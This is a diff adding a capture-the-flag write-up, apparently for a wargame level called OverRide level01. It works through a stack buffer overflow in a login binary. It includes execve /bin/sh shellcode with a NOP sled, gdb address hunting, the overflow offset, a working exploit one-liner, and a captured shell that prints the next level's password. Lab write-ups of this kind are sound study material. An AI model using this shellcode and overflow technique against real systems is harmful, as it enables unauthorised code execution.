@@ -1,0 +1,101 @@
+we have to put a username and a password.
+username = "dat_will"
+Normally the password is "admin" but that can not help us because whatever is
+the password, there is no call for a system function. That's why we have to
+provide our shellcode.
+
+export shellcode=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
+
+let's find the address of our shellcode by gdb :
+gdb-peda$ b verify_user_name
+Breakpoint 1 at 0x8048469
+gdb-peda$ r
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_will
+gdb-peda$ x/100s *environ
+[...]
+0xffffdacd:	 "shellcode=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
+x/100i 0xffffdacd
+   0xffffdacd:	jae    0xffffdb37
+   0xffffdacf:	gs
+   0xffffdad0:	ins    BYTE PTR es:[edi],dx
+   0xffffdad1:	ins    BYTE PTR es:[edi],dx
+   0xffffdad2:	arpl   WORD PTR [edi+0x64],bp
+   0xffffdad5:	gs
+   0xffffdad6:	cmp    eax,0x90909090
+   0xffffdadb:	nop
+   0xffffdadc:	nop
+   0xffffdadd:	nop
+   0xffffdade:	nop
+   0xffffdadf:	nop
+   0xffffdae0:	nop
+   0xffffdae1:	nop
+   0xffffdae2:	nop
+   0xffffdae3:	nop
+   0xffffdae4:	nop
+   0xffffdae5:	nop
+   0xffffdae6:	nop
+   0xffffdae7:	nop
+   0xffffdae8:	nop
+   0xffffdae9:	nop
+   0xffffdaea:	nop
+   0xffffdaeb:	nop
+   0xffffdaec:	nop
+   0xffffdaed:	nop => we can take this address for example
+   0xffffdaee:	nop
+   0xffffdaef:	nop
+   0xffffdaf0:	nop
+   0xffffdaf1:	nop
+   0xffffdaf2:	nop
+   0xffffdaf3:	nop
+   0xffffdaf4:	nop
+   0xffffdaf5:	nop
+   0xffffdaf6:	nop
+   0xffffdaf7:	nop
+   0xffffdaf8:	nop
+   0xffffdaf9:	nop
+   0xffffdafa:	nop
+   0xffffdafb:	nop
+   0xffffdafc:	nop
+   0xffffdafd:	nop
+   0xffffdafe:	nop
+   0xffffdaff:	nop
+   0xffffdb00:	nop
+   0xffffdb01:	nop
+   0xffffdb02:	nop
+   0xffffdb03:	nop
+   0xffffdb04:	nop
+   0xffffdb05:	nop
+   0xffffdb06:	nop
+   0xffffdb07:	nop
+   0xffffdb08:	nop
+   0xffffdb09:	nop
+   0xffffdb0a:	nop
+	[...]
+In the code we can see the fgets call :
+
+0x0804855c <+140>: mov eax,ds:0x804a020 0x08048561 <+145>: mov DWORD PTR [esp+0x8],eax 0x08048565 <+149>: mov DWORD PTR [esp+0x4],0x64 0x0804856d <+157>: lea eax,[esp+0x1c] 0x08048571 <+161>: mov DWORD PTR [esp],eax 0x08048574 <+164>: call 0x8048370 fgets@plt
+
+The buffer is stored on esp+0x1c. The fgets will read 0x64 (100)
+
+At the top of the main, there is a bzero on this buffer :
+
+0x080484db <+11>: lea ebx,[esp+0x1c] 0x080484df <+15>: mov eax,0x0 0x080484e4 <+20>: mov edx,0x10 0x080484e9 <+25>: mov edi,ebx 0x080484eb <+27>: mov ecx,edx 0x080484ed <+29>: rep stos DWORD PTR es:[edi],eax
+
+We can deduct the buffer size with the bzero : 0x10 (16)
+
+The fgets will overflow, let's try!
+EIP+0 found at offset: 80
+
+
+level01@OverRide:~$ (python -c 'print "dat_wil" + "\n" + "A" * 80 + "\xed\xda\xff\xff"'; cat) | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+whoami
+level02
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
